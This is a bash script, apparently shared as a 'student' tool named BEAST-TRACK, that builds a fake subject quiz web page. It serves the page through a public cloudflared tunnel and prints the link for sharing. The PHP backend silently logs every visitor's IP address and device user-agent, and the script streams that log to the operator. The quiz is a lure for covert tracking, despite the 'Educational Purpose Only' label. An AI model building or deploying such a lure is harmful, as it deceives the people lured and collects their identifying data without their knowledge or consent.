#!/bin/bash
# --- BEAST-TRACK v22.0 (COMPLETE STUDENT VERSION) ---
NC='\033[0m'; Bold='\033[1m'
PBlue='\033[1;34m'; PWhite='\033[1;37m'; PRed='\033[1;31m'; PYellow='\033[1;33m'
BCyan='\033[1;36m'; BGreen='\033[1;32m'; BPurple='\033[1;35m'

PORT=8888
SERVER_DIR="server"

# Preparation
mkdir -p $SERVER_DIR
rm -f $SERVER_DIR/*.png > /dev/null 2>&1
echo "--- SESSION RESTARTED: $(date) ---" > $SERVER_DIR/combined.log
chmod -R 755 $SERVER_DIR

clear

# --- SadFriends ASCII Banner ---
echo -e "${PBlue}${Bold} в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•— в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•— в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•— в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•— ${NC}"
echo -e "${PBlue}${Bold} в–Ҳв–Ҳв•”в•җв•җв–Ҳв–Ҳв•—в–Ҳв–Ҳв•”в•җв•җв•җв•җв•қв–Ҳв–Ҳв•”в•җв•җв–Ҳв–Ҳв•—в–Ҳв–Ҳв•”в•җв•җв•җв•җв•қв•ҡв•җв•җв–Ҳв–Ҳв•”в•җв•җв•қ ${NC}"
echo -e "${PWhite}${Bold} в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•”в•қв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•— в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•‘в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•— в–Ҳв–Ҳв•‘ ${NC}"
echo -e "${PWhite}${Bold} в–Ҳв–Ҳв•”в•җв•җв–Ҳв–Ҳв•—в–Ҳв–Ҳв•”в•җв•җв•қ в–Ҳв–Ҳв•”в•җв•җв–Ҳв–Ҳв•‘в•ҡв•җв•җв•җв•җв–Ҳв–Ҳв•‘ в–Ҳв–Ҳв•‘ ${NC}"
echo -e "${PRed}${Bold} в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•”в•қв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•—в–Ҳв–Ҳв•‘ в–Ҳв–Ҳв•‘в–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв–Ҳв•‘ в–Ҳв–Ҳв•‘ ${NC}"
echo -e "${PRed}${Bold} в•ҡв•җв•җв•җв•җв•җв•қ в•ҡв•җв•җв•җв•җв•җв•җв•қв•ҡв•җв•қ в•ҡв•җв•қв•ҡв•җв•җв•җв•җв•җв•җв•қ в•ҡв•җв•қ ${NC}"
echo -e " ${PYellow}вӯҗ вӯҗ вӯҗ QUIZ BEE TRACKER v22.0 вӯҗ вӯҗ вӯҗ${NC}"
echo -e " ${BCyan}Created by : ${PWhite}${Bold}SadFriends${NC}"
echo -e " ${BGreen}Status : ${PWhite}Educational Purpose Only${NC}"
echo -e "${PWhite} ==========================================${NC}"

# --- QUIZ SELECTION ---
echo -e "\n ${BCyan}${Bold}[ PILI NG QUIZ SUBJECT ]${NC}"
echo -e " ${PWhite} 1. MATHEMATICS${NC}"
echo -e " ${PBlue} 2. SCIENCE${NC}"
echo -e " ${BPurple} 3. ENGLISH${NC}"
echo -e " ${PYellow} 4. HISTORY${NC}"
read -p $'\n [*] Select вһӨ ' q_opt

case $q_opt in
1) 
    SUBJECT="MATHEMATICS"; S_COLOR="#3498db"
    Q1="What is 12 + 15?"; A1="27"; B1="29"
    Q2="What is 9 x 8?"; A2="72"; B2="81"
    ;;
2) 
    SUBJECT="SCIENCE"; S_COLOR="#2ecc71"
    Q1="What is H2O?"; A1="Water"; B1="Oxygen"
    Q2="The Red Planet is?"; A2="Mars"; B2="Jupiter"
    ;;
3) 
    SUBJECT="ENGLISH"; S_COLOR="#9b59b6"
    Q1="A word that names a person?"; A1="Noun"; B1="Verb"
    Q2="Opposite of 'Hot'?"; A2="Cold"; B2="Warm"
    ;;
4) 
    SUBJECT="HISTORY"; S_COLOR="#f1c40f"
    Q1="National Hero of PH?"; A1="Jose Rizal"; B1="Andres Bonifacio"
    Q2="Year of PH Independence?"; A2="1898"; B2="1945"
    ;;
*) 
    SUBJECT="GENERAL KNOWLEDGE"; S_COLOR="#e67e22"
    Q1="Is Earth flat?"; A1="No"; B1="Yes"
    Q2="Sun is a?"; A2="Star"; B2="Planet"
    ;;
esac

# --- PHP Backend Generation ---
cat <<EOF > $SERVER_DIR/index.php
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ua = \$_SERVER['HTTP_USER_AGENT'];
file_put_contents('combined.log', "IP: \$ip | Device: \$ua\n", FILE_APPEND);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$SUBJECT QUIZ</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .quiz-container { background: #2c3e50; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; width: 90%; max-width: 400px; border-top: 5px solid $S_COLOR; }
        h1 { color: $S_COLOR; margin-bottom: 20px; }
        .question { margin-bottom: 20px; font-size: 1.1em; }
        .btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; cursor: pointer; background: $S_COLOR; color: white; font-weight: bold; transition: 0.3s; }
        .btn:hover { opacity: 0.8; transform: scale(1.02); }
        .footer { margin-top: 20px; font-size: 0.8em; color: #bdc3c7; }
    </style>
</head>
<body>
    <div class="quiz-container">
        <h1>$SUBJECT</h1>
        <div id="quiz-box">
            <p class="question"><strong>Q1:</strong> $Q1</p>
            <button class="btn" onclick="nextQ()">$A1</button>
            <button class="btn" onclick="nextQ()">$B1</button>
        </div>
        <div class="footer">Educational Purpose Only вҖў SadFriends</div>
    </div>
    <script>
        function nextQ() {
            document.getElementById('quiz-box').innerHTML = \`
                <p class="question"><strong>Q2:</strong> $Q2</p>
                <button class="btn" onclick="finish()">$A2</button>
                <button class="btn" onclick="finish()">$B2</button>
            \`;
        }
        function finish() {
            alert('Quiz Completed! Thank you for participating.');
            location.reload();
        }
    </script>
</body>
</html>
EOF

# --- SERVER RUN ---
echo -e "${BGreen}[*] Starting Server on Port $PORT...${NC}"
fuser -k $PORT/tcp > /dev/null 2>&1
php -S 127.0.0.1:$PORT -t $SERVER_DIR > /dev/null 2>&1 &
PHP_PID=$!

# Cloudflared Tunnel
echo -e "${PYellow}[*] Booting Cloudflared Tunnel...${NC}"
cloudflared tunnel --url http://127.0.0.1:$PORT > cf.log 2>&1 &
CF_PID=$!

# Link Extraction
while true; do
    CF_LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cf.log)
    if [ ! -z "$CF_LINK" ]; then
        echo -e "\n${BGreen}${Bold}[+] QUIZ LINK: ${PWhite}$CF_LINK${NC}"
        echo -e "${BCyan}[*] Waiting for participants... (CTRL+C to STOP)${NC}\n"
        break
    fi
    sleep 2
done

# Cleanup on Exit
trap "kill $PHP_PID $CF_PID; rm -f cf.log; echo -e '\n${PRed}[!] Server Stopped.${NC}'; exit" INT TERM EXIT

# Show Logs
tail -f $SERVER_DIR/combined.log
